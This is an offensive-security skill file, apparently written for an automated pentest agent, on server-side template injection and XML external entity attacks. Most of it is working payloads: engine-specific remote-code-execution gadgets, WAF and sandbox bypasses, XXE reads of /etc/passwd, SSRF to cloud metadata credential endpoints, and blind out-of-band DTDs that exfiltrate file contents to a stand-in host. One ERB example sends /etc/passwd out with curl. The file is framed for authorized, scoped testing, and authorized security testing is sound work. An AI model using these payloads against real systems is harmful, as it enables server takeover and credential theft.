---
name: SSTI & XXE Testing
description: Detect server-side template injection (math eval -> RCE) and XML external entity injection (file read / SSRF), confirming with deterministic signals.
tags: [web, ssti, xxe, injection, owasp-a03]
recommended_tools: [http_repeater, http_intruder, arjun_parameter_discovery, nuclei_scan, jaeles_vulnerability_scan]
vuln_classes: [ssti, xxe]
domain: web
phase: exploitation
---
# SSTI & XXE Testing

## Server-Side Template Injection (SSTI)
Input reflected into a server-rendered template gets *evaluated*, not just echoed.

### Where to look
Names, subjects, profile/bio fields, error/notification text, email/PDF generators, `q`/`search` echoed back, CMS page content, any value rendered into a server template.

### Payload ladder: detect -> confirm -> escalate
1. **Polyglot probe** (errors reveal a template engine): `${{<%[%'"}}%\`.
2. **Math confirmation** — a computed result (not the literal string) confirms SSTI:
   - `{{7*7}}` -> **`49`** (Jinja2, Twig).  `${7*7}` -> `49` (Freemarker, Velocity, Spring EL).
   - `<%= 7*7 %>` -> `49` (ERB/Ruby).  `#{7*7}` -> `49` (some Ruby/Thymeleaf).  `@(7*7)` -> `49` (Razor).
3. **Disambiguate the engine** — `{{7*'7'}}` -> **`7777777`** = Jinja2; -> `49` = Twig. `${"".getClass()}` non-empty = Java EL/Freemarker.
4. **Escalate to RCE (in scope only)**:
   - Jinja2: `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` -> `uid=...gid=...`.
   - Twig: `{{['id']|filter('system')}}` / `{{['id']|map('system')|join}}`.
   - Freemarker: `<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}`.
   - Velocity: `#set($e="e")$e.getClass().forName("java.lang.Runtime")...exec("id")`.

### WAF / filter bypass
Spacing/alt braces `{{ 7 * 7 }}`, `{%print(7*7)%}`; attribute access `{{config|attr('items')}}`; dunder via `request`/`cycler`/`lipsum` in sandboxed Jinja; URL-encode braces; concatenate keywords (`'po'+'pen'`).

### Tool / manual
`http_intruder` sweeps `{{7*7}}`/`${7*7}`/`<%=7*7%>`/`#{7*7}` and flags bodies containing `49`/`7777777`. `nuclei_scan`/`jaeles_vulnerability_scan` for SSTI templates + interactsh OOB.
```
GET /profile?name={{7*7}} HTTP/1.1
Host: target
```
Response rendering `49` where `{{7*7}}` was placed = proof.

**Proof (verifier)**: `{{7*7}}` -> **`49`** (or Twig `{{7*'7'}}` -> **`7777777``) reflected as the computed value. For RCE, `id` -> `uid=...gid=...`.
**Chaining**: SSTI -> RCE -> secrets/lateral movement. CWE-1336 / CWE-94.

---

## XML External Entity (XXE)
XML parsers that resolve external entities can read files and reach internal services.

### Where to look
Any XML sink: `Content-Type: application/xml`/`text/xml`, SOAP, SAML responses, RSS/XML import, SVG/DOCX/XLSX uploads (zipped XML), `Content-Type` switch from JSON to XML on a JSON API.

### Payload ladder: detect -> confirm -> escalate
1. **In-band file read** — inject a DOCTYPE + external entity, reference it in a reflected field:
   ```xml
   <?xml version="1.0"?>
   <!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>
   <r>&x;</r>
   ```
   Confirm with **`root:x:0:0:`** in the response.
2. **PHP wrapper** (binary/large files): `<!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">` -> decode.
3. **Blind / OOB** (no reflection) — out-of-band exfil to a controlled host:
   ```xml
   <!DOCTYPE r [<!ENTITY % p SYSTEM "http://<oob>/x.dtd"> %p;]>
   ```
   where `x.dtd` defines a param entity that posts file contents to `http://<oob>/?d=...` (error-based exfil via nested entities for non-HTTP egress).
4. **SSRF via XXE**: `<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">` -> cloud creds.

### WAF / filter bypass
DTD over HTTP when inline `<!DOCTYPE>` is stripped; UTF-16/UTF-7 re-encode the XML body; CDATA wrap; XInclude when DOCTYPE is blocked: `<x xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></x>`; switch a JSON endpoint to `application/xml`.

### Tool / manual
`http_repeater`/`http_intruder` to post the crafted XML and read the raw response; `nuclei_scan`/`jaeles_vulnerability_scan` for XXE templates with interactsh for blind OOB.
```
POST /api/import HTTP/1.1
Host: target
Content-Type: application/xml

<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>
```

**Proof (verifier)**: the literal **`root:x:0:0:`** line reflected in the response (blind: OOB callback to your host).
**Chaining**: XXE -> file read (source/creds) -> ATO; XXE -> SSRF -> cloud metadata -> infra compromise; XXE -> DoS (billion laughs, out of scope). CWE-611.

**Safety**: confirm with read-only `/etc/passwd` or a benign OOB ping; metadata/credential theft and DoS payloads are HITL-gated and scope-bound.


<!-- Ingested from reference frameworks (skill-ingestion) -->
## SSTI: fingerprint-then-engine-specific RCE ladder

Step 1 break the parser with a polyglot, step 2 math-eval per syntax family (renders `49` = eval confirmed), step 3 deploy engine-matched RCE gadget.
```
Polyglot probe:  ${{<%[%'"}}%\
{{7*7}}    -> 49  => Jinja2 / Twig / Liquid / Pebble / Nunjucks
${7*7}     -> 49  => Freemarker / Velocity / Thymeleaf / SpEL / Mako
<%= 7*7 %> -> 49  => ERB / EJS / JSP
#{7*7}     -> 49  => Ruby (slim/some), or attribute context
```
Engine-matched RCE:
```
Jinja2:     {{ cycler.__init__.__globals__.os.popen('id').read() }}
Twig:       {{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
Freemarker: <#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
EJS:        <%= global.process.mainModule.require('child_process').execSync('id').toString() %>
Thymeleaf:  *{T(java.lang.Runtime).getRuntime().exec("id")}
Mako:       ${self.module.cache.util.os.system('id')}
Velocity:   #set($e="e")$e.getClass().forName("java.lang.Runtime")...
```
Proof signal: `7*7` renders as `49`; RCE gadget returns `id`/`hostname` output, OR creates a unique `/tmp/<rand>.txt` re-read in a follow-up request, OR fires an OAST callback (`{{ self.__init__.__globals__.os.system('nslookup {OAST}') }}`). Use a benign control twin: send polyglot AND an inert string through the same param; confirm only if the eval marker renders in the polyglot response and NOT the control.

## XXE: detection -> OOB exfil ladder + variant sinks
```
Inline read:     <!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>
PHP filter read: <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
Blind OOB (param entity, external evil.dtd):
  evil.dtd: <!ENTITY % data SYSTEM "file:///etc/hostname">
            <!ENTITY % wrap "<!ENTITY % exfil SYSTEM 'http://{OAST}/x?d=%data;'>">%wrap;%exfil;
  trigger:  <!DOCTYPE r [<!ENTITY % dtd SYSTEM "http://{OAST}/evil.dtd"> %dtd;]><r>fire</r>
SSRF pivot:      <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
XInclude:        <xi:include parse="text" href="file:///etc/passwd"/>
SVG-wrapped:     <!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg ...><text>&xxe;</text></svg>
XSLT RCE:        rt:exec(rt:getRuntime(),'id') via xmlns:rt="...xalan/java/java.lang.Runtime"
```
Apply across SVG/image upload, SOAP, XInclude, and XSLT sinks. Proof signal: entity content reflected in response, OR OAST query-string contains exfiltrated file contents, OR error path echoes file content (error-based multiline leak via forced parse failure).

## Modern techniques & real-world CVEs (via recon-skills)

### Gate 0 — deterministic validation before claiming (both classes)
Answer all three before writing anything:
1. **What can the attacker DO right now?** SSTI: `id`/`hostname` output or a unique OOB DNS/HTTP callback carrying a per-test marker. XXE: literal `/etc/passwd` / `win.ini` content in-response, OR an OOB callback carrying file contents, OR a reached internal SSRF endpoint (IMDS/admin).
2. **What does the victim LOSE?** Name the concrete secret: DB creds, AWS IAM keys, config with passwords, PII, internal topology. "Parser made a DNS request" or `{{7*7}}->49` inside a sandbox is *not* Critical by itself.
3. **Reproducible in 10 min from scratch?** One `curl`/repeater request, zero ambiguity about the vulnerable parameter and endpoint.

### XXE Pre-Severity probe — don't burn cycles on a hardened parser
Before SYSTEM file-read, send an inline (internal) entity first:
```xml
<!DOCTYPE r [<!ENTITY hello "world!">]><r>&hello;</r>
```
If `world!` does NOT echo back, general-entity expansion is disabled and `file://` won't work either — pivot. If it echoes, escalate to SYSTEM.

### XXE parser matrix — classic payloads are NOT universal in 2024+
Most mainstream stacks hardened their default XML parsers 2018-2024. Fingerprint before investing.

| Ecosystem / parser | Vulnerable by default? |
|---|---|
| Java SAX/DOM `XMLInputFactory` w/o disabling ext entities; JAXB/JAX-WS (older Spring); Struts (older) | **YES** |
| PHP `DOMDocument` / `simplexml_load_*` **with `LIBXML_NOENT`** | **YES** |
| .NET `XmlDocument`/`XmlReader` only if `XmlResolver` set + `DtdProcessing=Parse` (default since 4.5.2 is `Prohibit` → safe, throws on any DOCTYPE) | conditional |
| Ruby Nokogiri **with `DTDLOAD`** parse option | **YES** (default Nokogiri: safe) |
| Python `xml.sax`; Apache POI / python-docx re-parsing uploads; embedded/IoT firmware XML; legacy OOXML re-parse paths | **YES** |
| Python `xml.etree` ≥3.7.1, `lxml` ≥5.x (drops SYSTEM file even with `resolve_entities=True`), `minidom`, `defusedxml` | NO |

Fingerprint: `Server: Apache Tomcat` / `X-Powered-By: Servlet` → Java → likely YES; `X-Powered-By: PHP` + XML ingest → likely YES; `Microsoft-IIS` + `.aspx`/SOAP → likely YES on legacy.

### XXE URI-scheme & bypass wrappers (when `file://` is blocked)
```
netdoc:///etc/passwd                                   # Java-specific file read
jar:file:///etc/passwd!/                               # Java jar wrapper
gopher://internal-service:80/_GET%20/                  # SSRF to Redis/SMTP/etc
php://filter/convert.base64-encode/resource=/etc/passwd # binary-safe PHP read
expect://id                                            # PHP expect wrapper -> RCE (if enabled)
```
Keyword-blacklist bypasses: case-vary `<!DoCtYpE ... EnTiTy ... SyStEm>`; UTF-16 re-encode the whole body; parameter entity `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://oob"> %xxe;]>`; nested hex-encode the URI `&#x66;&#x69;&#x6c;&#x65;:///etc/passwd`. Content-Type validation bypass: `application/json; charset=xml`, `application/xml+json`, or omit Content-Type to force sniffing.

### DOCX/XLSX/PPTX (OOXML = zip of XML) injection
Unzip the doc, inject into `word/document.xml` or the container `[Content_Types].xml`, re-zip, upload:
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<Types xmlns="..."><Default Extension="rels" ContentType="&xxe;"/></Types>
```
Office/OOXML processors (Apache POI, LibreOffice integrations) frequently pre-render XML parts *before* disabling entity resolution. Same DOCX vector, filled with a Velocity/Freemarker gadget (`${T(java.lang.Runtime).getRuntime().exec("id")}`) hits mail-merge SSTI.

### Error-based OOB exfil when egress is filtered
```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY % error SYSTEM 'file:///notexist/%file;'>">
  %eval; %error;
]>
```
The nonexistent-path error message leaks the file contents (multiline) back in the response. DNS-only variant works where only port 53 egresses.

### Disclosed XXE reports (real bounties / CVEs)
- **Adobe Commerce/Magento "CosmicSting" CVE-2024-34102** (CVSS 9.8, exploited in-wild): REST JSON body reaches nested `simplexml_load_string()` in `Laminas\Http\PhpEnvironment\Request` without `LIBXML_NOENT` guard → external DTD reads `app/etc/env.php` crypt-key, POSTs it back → forged admin token → RCE. Modern XXE-to-RCE via nested deserialization.
- **Twitter SXMP/SOAP servlet XXE** (H1 #248668, $10,080, 2017) — Cloudhopper SXMP parsed inbound XML with default JAXP; reflected file read + HTTP callback. Classic SOAP-XXE reference.
- **Mail.ru Pulse RSS/Atom feed XXE** (H1 #505947, $6,000, 2019) — `file:///etc/passwd` in feed body reflected via `<title>&xxe;</title>`; ingestion parser had external general entities enabled.
- **Open-Xchange PPTX blind XXE** (H1 #334488, $2,000, 2018) — modified `ppt/slides/slide1.xml` with param-entity DTD callback; OOXML pre-render before entity shutdown.
- **Zivver SVG profile-pic upload XXE → SSRF** (H1 #897244, 2020) — thumbnailer resolved external entities → IMDS via `<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">`.
- **Uber ubermovement.com blind OOB XXE** (H1 #154096, $500, 2016) — vendor XML endpoint resolved SYSTEM entities; sandboxed (blind ping only). A single shared-backend XXE elsewhere reached 26+ Uber public domains via one internal microservice.

Three of these (PPTX, Zivver, Uber) are OOB-required — no Collaborator/interactsh callback = not confirmed. CWE-611.

### SSTI — additions
**Error-reveal fingerprint:** send an unclosed expression (`{{badger`) — the stack trace often prints engine name, framework version, and file paths. Engine-specific error strings: `Template '{{...}}' not found` → Twig/Symfony; `org.springframework.expression.spel` → Spring/Thymeleaf; `Method __construct not found` / `Undefined variable: 7*7` → Smarty.

**Spring Boot property leak (no math):** `${user.name}`, `${T(...)}` evaluated in header/cookie contexts can disclose sensitive properties before RCE.

**Sandbox escape primitives:** Jinja2 `SandboxedEnvironment` — `lipsum` and `cycler` remain in default globals: `{{lipsum.__globals__.os.popen('id').read()}}`. Twig sandbox — `{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}`. Length-limited fields: `{{lipsum.__globals__.os.popen('id').read()}}` is ~50 chars; move to POST body for longer chains.

**Additional engine RCE gadgets:**
```
Smarty (PHP):      {php}echo shell_exec("id");{/php}   or   {system('id')}
Velocity (Java):   #set($rt=$class.inspect("java.lang.Runtime").getRuntime())$rt.exec("id")
ERB (Ruby):        <%= `id` %>   /   <%= IO.popen("id").read() %>
Thymeleaf/SpEL:    ${#rt = @java.lang.Runtime@getRuntime(),#rt.exec("id")}
```

**Blind SSTI root causes worth probing:** email templates (order/reset/welcome mails render the attacker's stored name), PDF/invoice generators, CMS page-builder preview endpoints, Rails `t('welcome', name: input)` — translation strings are HTML-safe by default, enabling SSTI via locale interpolation, and dev endpoints like `/render`, `/email-preview` left in prod. All are blind — confirm via OOB DNS/HTTP with a unique marker. CWE-1336 / CWE-94.

**Disclosed SSTI patterns:** e-commerce order-confirmation email with Jinja2-rendered username → RCE on the mail server (DB + order-pipeline access); Java CMS Freemarker preview → editor-to-OS RCE via `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`; Rails PDF invoice with ERB `<%= system("curl -F 'data=@/etc/passwd' http://COLLAB") %>` → blind exfil. Sources: hackerone_public, portswigger_research, synacktiv_research, assetnote_research.
